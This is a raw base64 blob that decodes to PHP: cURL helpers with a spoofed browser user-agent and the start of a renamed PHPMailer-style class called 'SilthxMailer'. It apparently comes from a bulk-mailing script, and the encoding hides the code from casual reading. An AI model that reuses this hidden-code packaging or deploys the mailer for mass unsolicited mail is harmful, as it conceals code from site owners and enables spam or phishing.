KICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1RJTUVPVVQsIDE1KTsNCiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRU5DT0RJTkcsICdnemlwLCBkZWZsYXRlJyk7DQogICAgJGhlYWRlcnMgICA9IGFycmF5KCk7DQogICAgJGhlYWRlcnNbXSA9ICJVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IHJ2OjQ1LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNDUuMCI7DQogICAgJGhlYWRlcnNbXSA9ICJBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOCI7DQogICAgJGhlYWRlcnNbXSA9ICJBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41IjsNCiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSFRUUEhFQURFUiwgJGhlYWRlcnMpOw0KICAgICRwYWdlICAgICA9IGN1cmxfZXhlYygkY2gpOw0KICAgICRodHRwY29kZSA9IGN1cmxfZ2V0aW5mbygkY2gsIENVUkxJTkZPX0hUVFBfQ09ERSk7DQogICAgaWYoKCRodHRwY29kZSA+PSA1MDAgJiYgJGh0dHBjb2RlIDwgNjAwKSBvciAoJGh0dHBjb2RlID49IDQwMCAmJiAkaHR0cGNvZGUgPCA1MDApKSB7IHJldHVybiAiUkVNT1RFX0VSUk9SXyIuJGh0dHBjb2RlLiJfQ1VSTHwiIC4gJHVybDsgfQ0KDQogICAgaWYgKGN1cmxfZXJybm8oJGNoKSkgew0KICAgICAgICByZXR1cm4gIlJFTU9URV9DVVJMX0VSUk5PfCIgLiBjdXJsX2Vycm9yKCRjaCk7DQogICAgfQ0KICAgIGN1cmxfY2xvc2UoJGNoKTsNCiAgICByZXR1cm4gJHBhZ2U7DQp9DQpmdW5jdGlvbiBHZXRQYWdlQ29udGVudCgkdXJsLCAkcG9zdEZpZWxkcyA9IG51bGwpIHsNCiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2luaXQnKSkgew0KICAgICAgICByZXR1cm4gY1VSTFJlcXVlc3QoJHVybCwgJHBvc3RGaWVsZHMpOw0KICAgIH0gZWxzZWlmICghZnVuY3Rpb25fZXhpc3RzKCdmaWxlX2dldF9jb250ZW50cycpKSB7DQogICAgICAgIHJldHVybiAnZmlsZV9nZXRfY29udGVudHMgbm90IGF2YWlsYWJsZSAhJzsNCiAgICB9IGVsc2Ugew0KICAgICAgICBpZiAoaXNfYXJyYXkoJHBvc3RGaWVsZHMpKSB7DQogICAgICAgICAgICAkcG9zdGRhdGEgPSBodHRwX2J1aWxkX3F1ZXJ5KCRwb3N0RmllbGRzKTsNCiAgICAgICAgICAgICRvcHRzICAgICA9IGFycmF5KA0KICAgICAgICAgICAgICAgICdodHRwJyA9PiBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLA0KICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAnQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLA0KICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gJHBvc3RkYXRhDQogICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICRjb250ZXh0ICA9IHN0cmVhbV9jb250ZXh0X2NyZWF0ZSgkb3B0cyk7DQogICAgICAgICAgICAkcmVzdWx0ICAgPSBAZmlsZV9nZXRfY29udGVudHMoJHVybCwgZmFsc2UsICRjb250ZXh0KTsNCiAgICAgICAgICAgIHJldHVybiAkcmVzdWx0Ow0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgcmV0dXJuIEBmaWxlX2dldF9jb250ZW50cygkdXJsKTsNCiAgICAgICAgfQ0KICAgIH0NCn0NCmZ1bmN0aW9uIHVybF9vcmlnaW4oJHMsICR1c2VfZm9yd2FyZGVkX2hvc3QgPSBmYWxzZSkgew0KICAgICRzc2wgICAgICA9ICghZW1wdHkoJHNbJ0hUVFBTJ10pICYmICRzWydIVFRQUyddID09ICdvbicpOw0KICAgICRzcCAgICAgICA9IHN0cnRvbG93ZXIoJHNbJ1NFUlZFUl9QUk9UT0NPTCddKTsNCiAgICAkcHJvdG9jb2wgPSBzdWJzdHIoJHNwLCAwLCBzdHJwb3MoJHNwLCAnLycpKSAuICgoJHNzbCkgPyAncycgOiAnJyk7DQogICAgJHBvcnQgICAgID0gJHNbJ1NFUlZFUl9QT1JUJ107DQogICAgJHBvcnQgICAgID0gKCghJHNzbCAmJiAkcG9ydCA9PSAnODAnKSB8fCAoJHNzbCAmJiAkcG9ydCA9PSAnNDQzJykpID8gJycgOiAnOicgLiAkcG9ydDsNCiAgICAkaG9zdCAgICAgPSAoJHVzZV9mb3J3YXJkZWRfaG9zdCAmJiBpc3NldCgkc1snSFRUUF9YX0ZPUldBUkRFRF9IT1NUJ10pKSA/ICRzWydIVFRQX1hfRk9SV0FSREVEX0hPU1QnXSA6IChpc3NldCgkc1snSFRUUF9IT1NUJ10pID8gJHNbJ0hUVFBfSE9TVCddIDogbnVsbCk7DQogICAgJGhvc3QgICAgID0gaXNzZXQoJGhvc3QpID8gJGhvc3QgOiAkc1snU0VSVkVSX05BTUUnXSAuICRwb3J0Ow0KICAgIHJldHVybiAkcHJvdG9jb2wgLiAnOi8vJyAuICRob3N0Ow0KfQ0KZnVuY3Rpb24gZnVsbF91cmwoJHMsICR1c2VfZm9yd2FyZGVkX2hvc3QgPSBmYWxzZSkgew0KICAgICRVUkkgPSBleHBsb2RlKCc/JywgJHNbJ1JFUVVFU1RfVVJJJ10pOw0KICAgIHJldHVybiB1cmxfb3JpZ2luKCRzLCAkdXNlX2ZvcndhcmRlZF9ob3N0KSAuICRVUklbMF07DQp9DQpjbGFzcyBTaWx0aHhNYWlsZXIgew0KICAgIHB1YmxpYyAkUHJpb3JpdHkgPSBudWxsOw0KICAgIHB1YmxpYyAkQ2hhclNldCA9ICdpc28tODg1OS0xJzsNCiAgICBwdWJsaWMgJENvbnRlbnRUeXBlID0gJ3RleHQvcGxhaW4nOw0KICAgIHB1YmxpYyAkRW5jb2RpbmcgPSAnOGJpdCc7DQogICAgcHVibGljICRFcnJvckluZm8gPSAnJzsNCiAgICBwdWJsaWMgJEZyb20gPSAncm9vdEBsb2NhbGhvc3QnOw0KICAgIHB1YmxpYyAkRnJvbU5hbWUgPSAnUm9vdCBVc2VyJzsNCiAgICBwdWJsaWMgJFNlbmRlciA9ICcnOw0KICAgIHB1YmxpYyAkUmV0dXJuUGF0aCA9ICcnOw0KICAgIHB1YmxpYyAkU3ViamVjdCA9ICcnOw0KICAgIHB1YmxpYyAkQm9keSA9ICcnOw0KICAgIHB1YmxpYyAkQWx0Qm9keSA9ICcnOw0KICAgIHB1YmxpYyAkSWNhbCA9ICcnOw0KICAgIHByb3RlY3RlZCAkTUlNRUJvZHkgPSAnJzsNCiAgICBwcm90ZWN0ZWQgJE1JTUVIZWFkZXIgPSAnJzsNCiAgICBwcm90ZWN0ZWQgJG1haWxIZWFkZXIgPSAnJzsNCiAgICBwdWJsaWMgJFdvcmRXcmFwID0gMDsNCiAgICBwdWJsaWMgJE1haWxlciA9ICdtYWlsJzsNCiAgICBwdWJsaWMgJFNlbmRtYWlsID0gJy91c3Ivc2Jpbi9zZW5kbWFpbCc7DQogICAgcHVibGljICRVc2VTZW5kbWFpbE9wdGlvbnMgPSB0cnVlOw0KICAgIHB1YmxpYyAkUGx1Z2luRGlyID0gJyc7DQogICAgcHVibGljICRDb25maXJtUmVhZGluZ1RvID0gJyc7DQogICAgcHVibGljICRIb3N0bmFtZSA9ICcnOw0KICAgIHB1YmxpYyAkTWVzc2FnZUlEID0gJyc7DQogICAgcHVibGljICRNZXNzYWdlRGF0ZSA9ICcnOw0KICAgIHB1YmxpYyAkSG9zdCA9ICdsb2NhbGhvc3QnOw0KICAgIHB1YmxpYyAkUG9ydCA9IDI1Ow0KICAgIHB1YmxpYyAkSGVsbyA9ICcnOw0KICAgIHB1YmxpYyAkU01UUFNlY3VyZSA9ICcnOw0KICAgIHB1YmxpYyAkVXNlU29ja3MgPSBmYWxzZTsNCiAgICBwdWJsaWMgJFNvY2tzSG9zdCA9IG51bGw7DQogICAgcHVibGljICRTb2Nrc1BvcnQgPSAwOw0KICAgIHB1YmxpYyAkU01UUEF1dG9UTFMgPSB0cnVlOw0KICAgIHB1YmxpYyAkU01UUEF1dGggPSBmYWxzZTsNCiAgICBwdWJsaWMgJFNNVFBPcHRpb25zID0gYXJyYXkoKTsNCiAgICBwdWJsaWMgJFVzZXJuYW1lID0gJyc7DQogICAgcHVibGljICRQYXNzd29yZCA9ICcnOw0KICAgIHB1YmxpYyAkQXV0aFR5cGUgPSAnJzsNCiAgICBwdWJsaWMgJFJlYWxtID0gJyc7DQogICAgcHVibGljICRXb3Jrc3RhdGlvbiA9ICcnOw0KICAgIHB1YmxpYyAkVGltZW91dCA9IDEwOw0KICAgIHB1YmxpYyAkU01UUERlYnVnID0gMDsNCiAgICBwdWJsaWMgJERlYnVnb3V0cHV0ID0gJ2VjaG8nOw0KICAgIHB1YmxpYyAkU01UUEtlZXBBbGl2ZSA9IGZhbHNlOw0KICAgIHB1YmxpYyAkU2luZ2xlVG8gPSBmYWxzZTsNCiAgICBwdWJsaWMgJFNpbmdsZVRvQXJyYXkgPSBhcnJheSgpOw0KICAgIHB1YmxpYyAkZG9fdmVycCA9IGZhbHNlOw0KICAgIHB1YmxpYyAkQWxsb3dFbXB0eSA9IGZhbHNlOw0KICAgIHB1YmxpYyAkTEUgPSAiXG4iOw0KICAgIHB1YmxpYyAkREtJTV9zZWxlY3RvciA9ICcnOw0KICAgIHB1YmxpYyAkREtJTV9pZGVudGl0eSA9ICcnOw0KICAgIHB1YmxpYyAkREtJTV9wYXNzcGhyYXNlID0gJyc7DQogICAgcHVibGljICRES0lNX2RvbWFpbiA9ICcnOw0KICAgIHB1YmxpYyAkREtJTV9wcml2YXRlID0gJyc7DQogICAgcHVibGljICRES0lNX3ByaXZhdGVfc3RyaW5nID0gJyc7DQogICAgcHVibGljICRhY3Rpb25fZnVuY3Rpb24gPSAnJzsNCiAgICBwdWJsaWMgJFhNYWlsZXIgPSAnJzsNCiAgICBwdWJsaWMgc3RhdGljICR2YWxpZGF0b3IgPSAnYXV0byc7DQogICAgcHJvdGVjdGVkICRzbXRwID0gbnVsbDsNCiAgICBwcm90ZWN0ZWQgJHRvID0gYXJyYXkoKTsNCiAgICBwcm90ZWN0ZWQgJGNjID0gYXJyYXkoKTsNCiAgICBwcm90ZWN0ZWQgJGJjYyA9IGFycmF5KCk7DQogICAgcHJvdGVjdGVkICRSZXBseVRvID0gYXJyYXkoKTsNCiAgICBwcm90ZWN0ZWQgJGFsbF9yZWNpcGllbnRzID0gYXJyYXkoKTsNCiAgICBwcm90ZWN0ZWQgJFJlY2lwaWVudHNRdWV1ZSA9IGFycmF5KCk7DQogICAgcHJvdGVjdGVkICRSZXBseVRvUXVldWUgPSBhcnJheSgpOw0KICAgIHByb3RlY3RlZCAkYXR0YWNobWVudCA9IGFycmF5KCk7DQogICAgcHJvdGVjdGVkICRDdXN0b21IZWFkZXIgPSBhcnJheSgpOw0KICAgIHByb3RlY3RlZCAkbGFzdE1lc3NhZ2VJRCA9ICcnOw0KICAgIHByb3RlY3RlZCAkbWVzc2FnZV90eXBlID0gJyc7DQogICAgcHJvdGVjdGVkICRib3VuZGFyeSA9IGFycmF5KCk7DQogICAgcHJvdGVjdGVkICRsYW5ndWFnZSA9IGFycmF5KCk7DQogICAgcHJvdGVjdGVkICRlcnJvcl9jb3VudCA9IDA7DQogICAgcHJvdGVjdGVkICRzaWduX2NlcnRfZmlsZSA9ICcnOw0KICAgIHByb3RlY3RlZCAkc2lnbl9rZXlfZmlsZSA9ICcnOw0KICAgIHByb3RlY3RlZCAkc2lnbl9leHRyYWNlcnRzX2ZpbGUgPSAnJzsNCiAgICBwcm90ZWN0ZWQgJHNpZ25fa2V5X3Bhc3MgPSAnJzsNCiAgICBwcm90ZWN0ZWQgJGV4Y2VwdGlvbnMgPSBmYWxzZTsNCiAgICBwcm90ZWN0ZWQgJHVuaXF1ZWlkID0gJyc7DQogICAgY29uc3QgU1RPUF9NRVNTQUdFID0gMDsNCiAgICBjb25zdCBTVE9QX0NPTlRJTlVFID0gMTsNCiAgICBjb25zdCBTVE9QX0NSSVRJQ0FMID0gMjsNCiAgICBjb25zdCBDUkxGID0gIlxyXG4iOw0KICAgIGNvbnN0IE1BWF9MSU5FX0xFTkdUSCA9IDk5ODsNCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJGV4Y2VwdGlvbnMgPSBudWxsKSB7DQogICAgICAgIGlmICgkZXhjZXB0aW9ucyAhPT0gbnVsbCkgew0KICAgICAgICAgICAgJHRoaXMtPmV4Y2VwdGlvbnMgPSAoYm9vbGVhbikgJGV4Y2VwdGlvbnM7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKSB7DQogICAgICAgICR0aGlzLT5zbXRwQ2xvc2UoKTsNCiAgICB9DQogICAgcHJpdmF0ZSBmdW5jdGlvbiBtYWlsUGFzc3RocnUoJHRvLCAkc3ViamVjdCwgJGJvZHksICRoZWFkZXIsICRwYXJhbXMpIHsNCiAgICAgICAgaWYgKGluaV9nZXQoJ21ic3RyaW5nLmZ1bmNfb3ZlcmxvYWQnKSAmIDEpIHsNCiAgICAgICAgICAgICRzdWJqZWN0ID0gJHRoaXMtPnNlY3VyZUhlYWRlcigkc3ViamVjdCk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkc3ViamVjdCA9ICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkc3ViamVjdCkpOw0KICAgICAgICB9DQogICAgICAgIGlmIChpbmlfZ2V0KCdzYWZlX21vZGUnKSBvciAhJHRoaXMtPlVzZVNlbmRtYWlsT3B0aW9ucyBvciBpc19udWxsKCRwYXJhbXMpKSB7DQogICAgICAgICAgICAkcmVzdWx0ID0gQG1haWwoJHRvLCAkc3ViamVjdCwgJGJvZHksICRoZWFkZXIpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHJlc3VsdCA9IEBtYWlsKCR0bywgJHN1YmplY3QsICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJHJlc3VsdDsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGVkZWJ1Zygkc3RyKSB7DQogICAgICAgIGlmICgkdGhpcy0+U01UUERlYnVnIDw9IDApIHsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIWluX2FycmF5KCR0aGlzLT5EZWJ1Z291dHB1dCwgYXJyYXkoDQogICAgICAgICAgICAnZXJyb3JfbG9nJywNCiAgICAgICAgICAgICdodG1sJywNCiAgICAgICAgICAgICdlY2hvJw0KICAgICAgICApKSBhbmQgaXNfY2FsbGFibGUoJHRoaXMtPkRlYnVnb3V0cHV0KSkgew0KICAgICAgICAgICAgY2FsbF91c2VyX2Z1bmMoJHRoaXMtPkRlYnVnb3V0cHV0LCAkc3RyLCAkdGhpcy0+U01UUERlYnVnKTsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgICBzd2l0Y2ggKCR0aGlzLT5EZWJ1Z291dHB1dCkgew0KICAgICAgICAgICAgY2FzZSAnZXJyb3JfbG9nJzoNCiAgICAgICAgICAgICAgICBlcnJvcl9sb2coJHN0cik7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdodG1sJzoNCiAgICAgICAgICAgICAgICBlY2hvIGh0bWxlbnRpdGllcyhwcmVnX3JlcGxhY2UoJy9bXHJcbl0rLycsICcnLCAkc3RyKSwgRU5UX1FVT1RFUywgJ1VURi04JykgLiAiPGJyPlxuIjsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2VjaG8nOg0KICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAkc3RyID0gcHJlZ19yZXBsYWNlKCcvXHJcbj8vbXMnLCAiXG4iLCAkc3RyKTsNCiAgICAgICAgICAgICAgICBlY2hvIGdtZGF0ZSgnWS1tLWQgSDppOnMnKSAuICJcdCIgLiBzdHJfcmVwbGFjZSgiXG4iLCAiXG4gICAgICAgICAgICAgICAgICAgXHQgICAgICAgICAgICAgICAgICAiLCB0cmltKCRzdHIpKSAuICJcbiI7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGlzSFRNTCgkaXNIdG1sID0gdHJ1ZSkgew0KICAgICAgICBpZiAoJGlzSHRtbCkgew0KICAgICAgICAgICAgJHRoaXMtPkNvbnRlbnRUeXBlID0gJ3RleHQvaHRtbCc7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkdGhpcy0+Q29udGVudFR5cGUgPSAndGV4dC9wbGFpbic7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGlzU01UUCgpIHsNCiAgICAgICAgJHRoaXMtPk1haWxlciA9ICdzbXRwJzsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGlzTWFpbCgpIHsNCiAgICAgICAgJHRoaXMtPk1haWxlciA9ICdtYWlsJzsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGlzU2VuZG1haWwoKSB7DQogICAgICAgICRpbmlfc2VuZG1haWxfcGF0aCA9IGluaV9nZXQoJ3NlbmRtYWlsX3BhdGgnKTsNCiAgICAgICAgaWYgKCFzdHJpc3RyKCRpbmlfc2VuZG1haWxfcGF0aCwgJ3NlbmRtYWlsJykpIHsNCiAgICAgICAgICAgICR0aGlzLT5TZW5kbWFpbCA9ICcvdXNyL3NiaW4vc2VuZG1haWwnOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJGluaV9zZW5kbWFpbF9wYXRoOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5NYWlsZXIgPSAnc2VuZG1haWwnOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNRbWFpbCgpIHsNCiAgICAgICAgJGluaV9zZW5kbWFpbF9wYXRoID0gaW5pX2dldCgnc2VuZG1haWxfcGF0aCcpOw0KICAgICAgICBpZiAoIXN0cmlzdHIoJGluaV9zZW5kbWFpbF9wYXRoLCAncW1haWwnKSkgew0KICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJy92YXIvcW1haWwvYmluL3FtYWlsLWluamVjdCc7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkdGhpcy0+U2VuZG1haWwgPSAkaW5pX3NlbmRtYWlsX3BhdGg7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPk1haWxlciA9ICdxbWFpbCc7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRBZGRyZXNzKCRhZGRyZXNzLCAkbmFtZSA9ICcnKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+YWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCd0bycsICRhZGRyZXNzLCAkbmFtZSk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRDQygkYWRkcmVzcywgJG5hbWUgPSAnJykgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygnY2MnLCAkYWRkcmVzcywgJG5hbWUpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQkNDKCRhZGRyZXNzLCAkbmFtZSA9ICcnKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+YWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCdiY2MnLCAkYWRkcmVzcywgJG5hbWUpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkUmVwbHlUbygkYWRkcmVzcywgJG5hbWUgPSAnJykgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygnUmVwbHktVG8nLCAkYWRkcmVzcywgJG5hbWUpOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gYWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCRraW5kLCAkYWRkcmVzcywgJG5hbWUpIHsNCiAgICAgICAgJGFkZHJlc3MgPSB0cmltKCRhZGRyZXNzKTsNCiAgICAgICAgJG5hbWUgICAgPSB0cmltKHByZWdfcmVwbGFjZSgnL1tcclxuXSsvJywgJycsICRuYW1lKSk7DQogICAgICAgIGlmICgoJHBvcyA9IHN0cnJwb3MoJGFkZHJlc3MsICdAJykpID09PSBmYWxzZSkgew0KICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJykgLiAiIChhZGRBbkFkZHJlc3MgJGtpbmQpOiAkYWRkcmVzcyI7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICAkcGFyYW1zID0gYXJyYXkoDQogICAgICAgICAgICAka2luZCwNCiAgICAgICAgICAgICRhZGRyZXNzLA0KICAgICAgICAgICAgJG5hbWUNCiAgICAgICAgKTsNCiAgICAgICAgaWYgKCR0aGlzLT5oYXM4Yml0Q2hhcnMoc3Vic3RyKCRhZGRyZXNzLCArKyRwb3MpKSBhbmQgJHRoaXMtPmlkblN1cHBvcnRlZCgpKSB7DQogICAgICAgICAgICBpZiAoJGtpbmQgIT0gJ1JlcGx5LVRvJykgew0KICAgICAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cygkYWRkcmVzcywgJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlJlY2lwaWVudHNRdWV1ZVskYWRkcmVzc10gPSAkcGFyYW1zOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cygkYWRkcmVzcywgJHRoaXMtPlJlcGx5VG9RdWV1ZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlJlcGx5VG9RdWV1ZVskYWRkcmVzc10gPSAkcGFyYW1zOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGNhbGxfdXNlcl9mdW5jX2FycmF5KGFycmF5KA0KICAgICAgICAgICAgJHRoaXMsDQogICAgICAgICAgICAnYWRkQW5BZGRyZXNzJw0KICAgICAgICApLCAkcGFyYW1zKTsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGFkZEFuQWRkcmVzcygka2luZCwgJGFkZHJlc3MsICRuYW1lID0gJycpIHsNCiAgICAgICAgaWYgKCFpbl9hcnJheSgka2luZCwgYXJyYXkoDQogICAgICAgICAgICAndG8nLA0KICAgICAgICAgICAgJ2NjJywNCiAgICAgICAgICAgICdiY2MnLA0KICAgICAgICAgICAgJ1JlcGx5LVRvJw0KICAgICAgICApKSkgew0KICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSAkdGhpcy0+bGFuZygnSW52YWxpZCByZWNpcGllbnQga2luZDogJykgLiAka2luZDsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIGlmICghJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcykpIHsNCiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpIC4gIiAoYWRkQW5BZGRyZXNzICRraW5kKTogJGFkZHJlc3MiOw0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRraW5kICE9ICdSZXBseS1UbycpIHsNCiAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cyhzdHJ0b2xvd2VyKCRhZGRyZXNzKSwgJHRoaXMtPmFsbF9yZWNpcGllbnRzKSkgew0KICAgICAgICAgICAgICAgIGFycmF5X3B1c2goJHRoaXMtPiRraW5kLCBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3MsDQogICAgICAgICAgICAgICAgICAgICRuYW1lDQogICAgICAgICAgICAgICAgKSk7DQogICAgICAgICAgICAgICAgJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJGFkZHJlc3MpXSA9IHRydWU7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoc3RydG9sb3dlcigkYWRkcmVzcyksICR0aGlzLT5SZXBseVRvKSkgew0KICAgICAgICAgICAgICAgICR0aGlzLT5SZXBseVRvW3N0cnRvbG93ZXIoJGFkZHJlc3MpXSA9IGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAkYWRkcmVzcywNCiAgICAgICAgICAgICAgICAgICAgJG5hbWUNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHBhcnNlQWRkcmVzc2VzKCRhZGRyc3RyLCAkdXNlaW1hcCA9IHRydWUpIHsNCiAgICAgICAgJGFkZHJlc3NlcyA9IGFycmF5KCk7DQogICAgICAgIGlmICgkdXNlaW1hcCBhbmQgZnVuY3Rpb25fZXhpc3RzKCdpbWFwX3JmYzgyMl9wYXJzZV9hZHJsaXN0JykpIHsNCiAgICAgICAgICAgICRsaXN0ID0gaW1hcF9yZmM4MjJfcGFyc2VfYWRybGlzdCgkYWRkcnN0ciwgJycpOw0KICAgICAgICAgICAgZm9yZWFjaCAoJGxpc3QgYXMgJGFkZHJlc3MpIHsNCiAgICAgICAgICAgICAgICBpZiAoJGFkZHJlc3MtPmhvc3QgIT0gJy5TWU5UQVgtRVJST1IuJykgew0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcy0+bWFpbGJveCAuICdAJyAuICRhZGRyZXNzLT5ob3N0KSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+IChwcm9wZXJ0eV9leGlzdHMoJGFkZHJlc3MsICdwZXJzb25hbCcpID8gJGFkZHJlc3MtPnBlcnNvbmFsIDogJycpLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdhZGRyZXNzJyA9PiAkYWRkcmVzcy0+bWFpbGJveCAuICdAJyAuICRhZGRyZXNzLT5ob3N0DQogICAgICAgICAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJGxpc3QgPSBleHBsb2RlKCcsJywg